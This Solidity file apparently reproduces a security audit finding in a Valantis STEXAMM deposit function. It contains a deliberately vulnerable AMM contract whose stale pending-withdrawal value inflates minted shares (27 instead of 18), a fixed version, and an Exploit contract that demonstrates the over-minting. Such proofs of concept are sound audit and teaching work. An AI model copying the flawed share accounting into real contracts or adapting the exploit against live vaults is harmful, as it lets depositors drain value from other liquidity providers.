// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Valantis STEXAMM deposit (Hexens, 2025-03).
    amountToken1PendingLPWithdrawal stays 12 after 6 of native token1
    arrives. amountToken0PendingUnstaking is already 6. A deposit of 18
    against reserves of 18 and supply of 18 mints 27 shares. Updating the
    pending withdrawal to 6 mints 18.
*/

contract AMM {
    uint256 public reserve1 = 18 ether;
    uint256 public supply = 18 ether;
    uint256 public pendingUnstaking = 6 ether;
    uint256 public pendingLP = 12 ether;
    mapping(address => uint256) public sharesOf;
    uint256 public lastShares;
    uint256 public lastReserve;
    uint256 public lastPending0;
    uint256 public lastPending1;
    uint256 public lastTotal;

    // Quoted deposit denominator: reserve1 + pending unstaking - pending LP withdrawal.
    function deposit(address to, uint256 amount) external returns (uint256 shares) {
        uint256 reserve1Pool = reserve1;
        lastReserve = reserve1Pool;
        uint256 pending0 = pendingUnstaking;
        lastPending0 = pending0;
        uint256 pending1 = pendingLP;
        lastPending1 = pending1;
        uint256 total = reserve1Pool + pending0 - pending1; // @> VULN: pendingLP is still 12, so total assets are 12 instead of 18
        lastTotal = total;
        shares = amount * supply / total;
        sharesOf[to] += shares;
        supply += shares;
        reserve1 += amount;
        lastShares = shares;
    }
}

contract AMMFixed {
    uint256 public reserve1 = 18 ether;
    uint256 public supply = 18 ether;
    uint256 public pendingUnstaking = 6 ether;
    uint256 public pendingLP = 6 ether;
    mapping(address => uint256) public sharesOf;

    function deposit(address to, uint256 amount) external returns (uint256 shares) {
        uint256 total = reserve1 + pendingUnstaking - pendingLP;
        shares = amount * supply / total;
        sharesOf[to] += shares;
        supply += shares;
        reserve1 += amount;
    }
}

contract ShareMarker {
    string public symbol = "EXTRA-SHARES";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }
}

contract Exploit {
    uint256 public constant AMOUNT = 18 ether;
    address public constant SINK = 0x000000000000000000000000000000000000D00d;

    AMM public amm;
    ShareMarker public marker;

    function run() external {
        amm = new AMM();
        marker = new ShareMarker();
        uint256 minted = amm.deposit(address(this), AMOUNT);
        require(minted == 27 ether, "27 shares");
        require(amm.sharesOf(address(this)) == 27 ether, "credited");
        marker.mint(SINK, 9 ether);
        require(marker.balanceOf(SINK) == 9 ether, "9 extra");
    }
}
